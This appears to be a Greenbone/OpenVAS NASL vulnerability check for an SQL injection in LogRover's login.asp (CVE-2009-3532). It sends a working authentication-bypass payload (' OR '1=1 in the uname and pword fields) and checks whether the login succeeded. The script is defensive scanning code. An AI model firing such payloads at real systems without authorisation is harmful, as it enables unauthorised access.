# SPDX-FileCopyrightText: 2009 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.801012");
  script_version("2024-06-13T05:05:46+0000");
  script_tag(name:"last_modification", value:"2024-06-13 05:05:46 +0000 (Thu, 13 Jun 2024)");
  script_tag(name:"creation_date", value:"2009-10-12 07:28:01 +0200 (Mon, 12 Oct 2009)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2009-3532");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("LogRover <= 2.3.3 SQLi Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2009 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "httpver.nasl", "webmirror.nasl",
                      "DDI_Directory_Scanner.nasl", "global_settings.nasl",
                      "gb_microsoft_iis_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_tag(name:"summary", value:"LogRover is prone to an SQL injection (SQLi) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP POST request and checks the response.");

  script_tag(name:"insight", value:"Input passed to the 'uname' and 'pword' parameters in
  'login.asp' is not properly sanitised before being used in SQL queries.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to conduct
  SQL injection attacks.");

  script_tag(name:"affected", value:"LogRover version 2.3.3 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://secunia.com/advisories/35821/");
  script_xref(name:"URL", value:"http://www.packetstormsecurity.org/0907-advisories/DDIVRT-2009-26.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");
include("port_service_func.inc");

port = http_get_port(default: 80);

if(!http_can_host_asp(port: port))
  exit(0);

url = "/LogRover/login.asp";

res = http_get_cache(port: port, item: url);
if (!res || res !~ "^HTTP/1\.[01] 200")
  exit(0);

headers = make_array("Content-Type", "application/x-www-form-urlencoded");

data = "uname=admin%27+OR+%271%3D1&pword=%27+OR+%271%3D1";

req = http_post_put_req(port: port, url: url, data: data, add_headers: headers);
res = http_keepalive_send_recv(port: port, data: req, bodyonly: TRUE);

if ("Invalid Username or Password" >!< res && "index1.asp" >< res) {
  report = http_report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
